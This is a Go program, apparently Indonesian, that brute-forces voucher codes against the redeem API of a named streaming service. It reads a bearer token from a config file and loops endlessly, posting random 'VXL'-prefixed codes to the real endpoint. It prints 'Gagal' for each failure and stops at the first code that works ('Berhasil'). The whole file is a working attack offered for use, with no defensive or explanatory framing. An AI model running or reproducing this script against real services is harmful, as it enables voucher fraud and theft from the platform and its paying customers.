package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

func generateRandomIntPattern() string {
	rand.Seed(time.Now().UnixNano())
	randomDigits := 10000000000 + rand.Intn(90000000000-10000000000)
	pattern := fmt.Sprintf("VXL%d", randomDigits)[:14]
	return pattern
}

func getBrute(vocode string, token string) map[string]interface{} {
	client := &http.Client{}
	reqBody := fmt.Sprintf(`{"voucher_code":"%s"}`, vocode)
	req, err := http.NewRequest("POST", "https://vplus-bss.visionplus.id/payduct/v1/transaction/redeem", strings.NewReader(reqBody))
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		return map[string]interface{}{"status": false}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return map[string]interface{}{"status": false}
	}

	var res map[string]interface{}
	err = json.Unmarshal(body, &res)
	if err != nil {
		return map[string]interface{}{"status": false}
	}

	return res
}

func main() {
	content, err := ioutil.ReadFile("config.json")
	if err != nil {
		panic(err)
	}
	var tokenMap map[string]string
	err = json.Unmarshal(content, &tokenMap)
	if err != nil {
		panic(err)
	}
	token := tokenMap["token"]

	for {
		gen := generateRandomIntPattern()
		brute := getBrute(gen, token)
		success, ok := brute["success"].(bool)
		if !ok {
			fmt.Println("Token not valid")
			break
		}
		if success {
			fmt.Println("Berhasil", gen)
			break
		}
		fmt.Println("Gagal", gen)
	}
}
